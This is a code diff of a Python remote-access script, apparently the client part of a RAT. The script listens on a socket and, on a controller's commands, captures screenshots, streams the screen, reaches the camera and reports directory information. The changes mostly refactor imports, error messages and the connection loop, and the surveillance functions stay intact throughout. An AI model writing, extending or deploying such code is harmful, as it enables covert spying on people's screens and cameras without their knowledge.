@@ -1,6 +1,11 @@
 #copyright © 2019 manoharkakumani
-import socket,os,subprocess,shutil,pickle,struct
-# Create a Socket ( connect two computers)
+import socket
+import os
+import subprocess
+import shutil
+import pickle
+import struct
+# Create a Socket
 def create_socket():
     try:
         global host
@@ -45,8 +50,9 @@ def sshot(conn):
         conn.send(('pyautogui not install in client').encode("utf-8"))
 #screen_streaming
 def stream(conn):
+    import platform
     try:
-        import cv2,numpy,platform
+        import cv2,numpy
         if platform.system()=="Windows":
             from PIL import ImageGrab
         else:
@@ -54,16 +60,19 @@ def stream(conn):
         conn.send(('OK').encode("utf-8"))
         while True:
             if conn.recv(4096).decode('utf-8')=="sst":
-                frame =numpy.array(ImageGrab.grab())
+                frame = numpy.array(ImageGrab.grab())
                 result, frame = cv2.imencode('.jpg', frame)
                 data = pickle.dumps(frame, 0)
                 size = len(data)
                 conn.sendall(struct.pack(">L", size) + data)
             else:
                 break
-                return
+        return
     except:
-        conn.send(('opencv-python or PIL not install in client').encode("utf-8"))
+        if platform.system()=="Windows":
+            conn.send(('opencv-python or PIL  or numpy not install in client').encode("utf-8"))
+        else:
+            conn.send(('opencv-python or pyscreenshot  or numpy not install in client').encode("utf-8"))
 
 #camera
 def cam(conn):
@@ -189,29 +198,21 @@ def main(s):
             stream(s)
         elif data[0]=='cwd':
             s.send((os.getcwd()).encode("utf-8"))
+        elif data[0]=='back':
+            s.close()
+            return "back"
         elif data[0]=='exit':
-            break
+            s.close()
+            return "exit"
         else:
             s.send(".".encode('utf-8'))
 
 
-# Establish connection with a client (socket must be listening)
+# Establish connection with a host (socket must be listening)
 
 def socket_accept():
     conn, address = s.accept()
-    main(conn)
-    conn.close()
-
+    return main(conn)
 create_socket()
 bind_socket()
-socket_accept()
-
-
-
-
-
-
-
-
-
-
+while socket_accept()=="back":continue
